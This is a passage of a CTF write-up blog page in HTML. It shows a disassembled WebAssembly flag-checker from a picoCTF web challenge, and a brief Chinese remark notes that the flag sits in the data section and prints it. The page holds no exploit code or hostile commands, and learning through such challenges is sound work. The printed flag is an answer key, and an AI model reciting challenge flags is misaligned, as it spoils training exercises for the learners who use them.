        <span class="token keyword">local</span>.set <span class="token number">16</span>
        <span class="token keyword">local</span>.get <span class="token number">15</span>
        <span class="token keyword">local</span>.get <span class="token number">16</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
        <span class="token keyword">local</span>.set <span class="token number">17</span>
        <span class="token keyword">block</span>  <span class="token comment">;; label = @3</span>
          <span class="token keyword">local</span>.get <span class="token number">17</span>
          <span class="token keyword">br_if</span> <span class="token number">0</span> <span class="token comment">(;@3;)</span>
          <span class="token keyword">local</span>.get <span class="token number">4</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">11</span>
          <span class="token keyword">local</span>.set <span class="token number">18</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
          <span class="token keyword">local</span>.set <span class="token number">19</span>
          <span class="token keyword">local</span>.get <span class="token number">18</span>
          <span class="token keyword">local</span>.get <span class="token number">19</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
          <span class="token keyword">local</span>.set <span class="token number">20</span>
          <span class="token keyword">local</span>.get <span class="token number">4</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">10</span>
          <span class="token keyword">local</span>.set <span class="token number">21</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
          <span class="token keyword">local</span>.set <span class="token number">22</span>
          <span class="token keyword">local</span>.get <span class="token number">21</span>
          <span class="token keyword">local</span>.get <span class="token number">22</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
          <span class="token keyword">local</span>.set <span class="token number">23</span>
          <span class="token keyword">local</span>.get <span class="token number">20</span>
          <span class="token keyword">local</span>.get <span class="token number">23</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>sub</span>
          <span class="token keyword">local</span>.set <span class="token number">24</span>
          <span class="token keyword">local</span>.get <span class="token number">4</span>
          <span class="token keyword">local</span>.get <span class="token number">24</span>
          <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">28</span>
          <span class="token keyword">br</span> <span class="token number">2</span> <span class="token comment">(;@1;)</span>
        <span class="token keyword">end</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">11</span>
        <span class="token keyword">local</span>.set <span class="token number">25</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
        <span class="token keyword">local</span>.set <span class="token number">26</span>
        <span class="token keyword">local</span>.get <span class="token number">25</span>
        <span class="token keyword">local</span>.get <span class="token number">26</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
        <span class="token keyword">local</span>.set <span class="token number">27</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">10</span>
        <span class="token keyword">local</span>.set <span class="token number">28</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
        <span class="token keyword">local</span>.set <span class="token number">29</span>
        <span class="token keyword">local</span>.get <span class="token number">28</span>
        <span class="token keyword">local</span>.get <span class="token number">29</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
        <span class="token keyword">local</span>.set <span class="token number">30</span>
        <span class="token keyword">local</span>.get <span class="token number">27</span>
        <span class="token keyword">local</span>.set <span class="token number">31</span>
        <span class="token keyword">local</span>.get <span class="token number">30</span>
        <span class="token keyword">local</span>.set <span class="token number">32</span>
        <span class="token keyword">local</span>.get <span class="token number">31</span>
        <span class="token keyword">local</span>.get <span class="token number">32</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>eq</span>
        <span class="token keyword">local</span>.set <span class="token number">33</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1</span>
        <span class="token keyword">local</span>.set <span class="token number">34</span>
        <span class="token keyword">local</span>.get <span class="token number">33</span>
        <span class="token keyword">local</span>.get <span class="token number">34</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
        <span class="token keyword">local</span>.set <span class="token number">35</span>
        <span class="token keyword">local</span>.get <span class="token number">35</span>
        <span class="token keyword">br_if</span> <span class="token number">0</span> <span class="token comment">(;@2;)</span>
      <span class="token keyword">end</span>
      <span class="token keyword">local</span>.get <span class="token number">4</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">11</span>
      <span class="token keyword">local</span>.set <span class="token number">36</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
      <span class="token keyword">local</span>.set <span class="token number">37</span>
      <span class="token keyword">local</span>.get <span class="token number">36</span>
      <span class="token keyword">local</span>.get <span class="token number">37</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
      <span class="token keyword">local</span>.set <span class="token number">38</span>
      <span class="token keyword">local</span>.get <span class="token number">4</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">10</span>
      <span class="token keyword">local</span>.set <span class="token number">39</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
      <span class="token keyword">local</span>.set <span class="token number">40</span>
      <span class="token keyword">local</span>.get <span class="token number">39</span>
      <span class="token keyword">local</span>.get <span class="token number">40</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
      <span class="token keyword">local</span>.set <span class="token number">41</span>
      <span class="token keyword">local</span>.get <span class="token number">38</span>
      <span class="token keyword">local</span>.get <span class="token number">41</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>sub</span>
      <span class="token keyword">local</span>.set <span class="token number">42</span>
      <span class="token keyword">local</span>.get <span class="token number">4</span>
      <span class="token keyword">local</span>.get <span class="token number">42</span>
      <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">28</span>
    <span class="token keyword">end</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">28</span>
    <span class="token keyword">local</span>.set <span class="token number">43</span>
    <span class="token keyword">local</span>.get <span class="token number">43</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token comment">(;2;)</span> <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">result</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token keyword">local</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">0</span>
    <span class="token keyword">local</span>.set <span class="token number">0</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1072</span>
    <span class="token keyword">local</span>.set <span class="token number">1</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1024</span>
    <span class="token keyword">local</span>.set <span class="token number">2</span>
    <span class="token keyword">local</span>.get <span class="token number">2</span>
    <span class="token keyword">local</span>.get <span class="token number">1</span>
    <span class="token keyword">call</span> <span class="token number">1</span>
    <span class="token keyword">local</span>.set <span class="token number">3</span>
    <span class="token keyword">local</span>.get <span class="token number">3</span>
    <span class="token keyword">local</span>.set <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">0</span>
    <span class="token keyword">local</span>.set <span class="token number">5</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">5</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>ne</span>
    <span class="token keyword">local</span>.set <span class="token number">6</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">-1</span>
    <span class="token keyword">local</span>.set <span class="token number">7</span>
    <span class="token keyword">local</span>.get <span class="token number">6</span>
    <span class="token keyword">local</span>.get <span class="token number">7</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>xor</span>
    <span class="token keyword">local</span>.set <span class="token number">8</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1</span>
    <span class="token keyword">local</span>.set <span class="token number">9</span>
    <span class="token keyword">local</span>.get <span class="token number">8</span>
    <span class="token keyword">local</span>.get <span class="token number">9</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>and</span>
    <span class="token keyword">local</span>.set <span class="token number">10</span>
    <span class="token keyword">local</span>.get <span class="token number">10</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token comment">(;3;)</span> <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">param</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token keyword">local</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token keyword">global</span>.get <span class="token number">0</span>
    <span class="token keyword">local</span>.set <span class="token number">2</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">16</span>
    <span class="token keyword">local</span>.set <span class="token number">3</span>
    <span class="token keyword">local</span>.get <span class="token number">2</span>
    <span class="token keyword">local</span>.get <span class="token number">3</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>sub</span>
    <span class="token keyword">local</span>.set <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">0</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">12</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">1</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">8</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">12</span>
    <span class="token keyword">local</span>.set <span class="token number">5</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">8</span>
    <span class="token keyword">local</span>.set <span class="token number">6</span>
    <span class="token keyword">local</span>.get <span class="token number">6</span>
    <span class="token keyword">local</span>.get <span class="token number">5</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store8</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">1072</span>
    <span class="token keyword">return</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">table</span> <span class="token comment">(;0;)</span> <span class="token number">1</span> <span class="token number">1</span> funcref<span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">memory</span> <span class="token comment">(;0;)</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;0;)</span> <span class="token punctuation">(</span><span class="token keyword">mut</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;1;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1072</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;2;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;3;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1328</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;4;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;5;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;6;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token comment">(;7;)</span> <span class="token keyword">i32</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"memory"</span> <span class="token punctuation">(</span><span class="token keyword">memory</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__wasm_call_ctors"</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"strcmp"</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"check_flag"</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"input"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"copy_char"</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__dso_handle"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__data_end"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__global_base"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__heap_base"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__memory_base"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__table_base"</span> <span class="token punctuation">(</span><span class="token keyword">global</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token comment">(;0;)</span> <span class="token punctuation">(</span><span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token string">"picoCTF&#123;cb688c00b5a2ede7eaedcae883735759&#125;\00\00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最後一航就可以看到 Flag 了，這邊就不繼續逆向回去，想繼續的話一樣可以使用這個工具裡面的其他工具去完成。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;cb688c00b5a2ede7eaedcae883735759&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="頭像"><img class="post-copyright__author_img_back" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="頭像" alt="頭像"><img class="post-copyright__author_img_front" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="頭像" alt="頭像"></a><div class="post-copyright__author_name">S1l3ntC0nquer</div><div class="post-copyright__author_desc">Hack the planet!</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="This article is original. Please be mindful of the copyright agreement." href="https://blog.S1l3ntC0nquer.in/posts/4f98706e/">Original</a><a class="post-copyright-title"><span onclick='rm.copyPageUrl("https://blog.S1l3ntC0nquer.in/posts/4f98706e/")'>All-in-One PicoCTF Writeups: Web</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="Support the author"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>Support</div><div class="reward-main"><div class="reward-all"><span class="reward-title">Thank's for supporting me!</span><ul class="reward-group"><li class="reward-item"><a href="https://buymeacoffee.com/S1l3ntC0nquer" target="_blank"><img class="post-qr-code-img" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/buymeacoffee.png" alt="Buy Me a Coffee"></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://blog.S1l3ntC0nquer.in" target="_blank"><img class="post-qr-code-img" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="S1l3ntC0nquer"></a><div class="post-qr-code-desc">S1l3ntC0nquer</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">Sponsor List</div><div class="reward-dec">Really thanks for your coffee🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display:none"></div></div><div class="shareRight"><script>function copyCurrentPageUrl(){var e=window.location.href,t=document.createElement("input");t.setAttribute("value",e),document.body.appendChild(t),t.select(),t.setSelectionRange(0,99999),document.execCommand("copy"),document.body.removeChild(t)}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="Copy link" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stated additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tags-punctuation"><i class="anzhiyufont anzhiyu-icon-tag"></i></span>Cybersecurity<span class="tagsPageCount">11</span></a><a class="post-meta__box__tags" href="/tags/PicoCTF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>PicoCTF<span class="tagsPageCount">13</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/6526bdbd/"><img class="prev-cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)</div></div></a></div><div class="next-post pull-right"><a href="/posts/4376026b/"><img class="next-cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">All-in-One PicoCTF Writeups: Misc (General Skills)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size:1.5rem;margin-right:4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/83db1007/" title="All-in-One PicoCTF Writeups: Forensics"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Forensics</div></div></a></div><div><a href="/posts/624b1c44/" title="All-in-One PicoCTF Writeups: Crypto"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Crypto</div></div></a></div><div><a href="/posts/4376026b/" title="All-in-One PicoCTF Writeups: Misc (General Skills)"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Misc (General Skills)</div></div></a></div><div><a href="/posts/6526bdbd/" title="All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)</div></div></a></div><div><a href="/posts/461e0005/" title="All-in-One PicoCTF Writeups: Reverse"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Reverse</div></div></a></div><div><a href="/posts/d01f5ccf/" title="2024 AIS3 Pre-exam Writeup"><img class="cover" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/Blog_cover%20(16)%20(1)_2fdc2382942f5aef8475bf32d3e8ab3d.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-02</div><div class="title">2024 AIS3 Pre-exam Writeup</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> Comment</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)" style="display:none">匿名評論</a><a href="/privacy" style="margin-left:4px">Privacy policy</a></div><div class="comment-tips" id="comment-tips"><span>✅ No need to delete blank lines, comment directly for the best display</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div><script>document.addEventListener("DOMContentLoaded",(function(){document.documentElement.lang="en"})),document.addEventListener("pjax:complete",(function(){document.documentElement.lang="en"}))</script></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"><div class="author-status"><img class="g-status" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/vampire.png" alt="status"></div></div><div class="author-info__description">This is S1l3ntC0nquer's blog. I share something about hacking, CTF, developing, and other interesting stuff. GLHF!</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">S1l3ntC0nquer</h1><div class="author-info__desc">Hack the planet!</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/S1l3ntC0nquer" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://www.facebook.com/profile.php?id=" target="_blank" title="Facebook"><i class="fa-brands fa-facebook faa-tada"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fontawesome fa-solid fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">0xDEADBEEF</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item 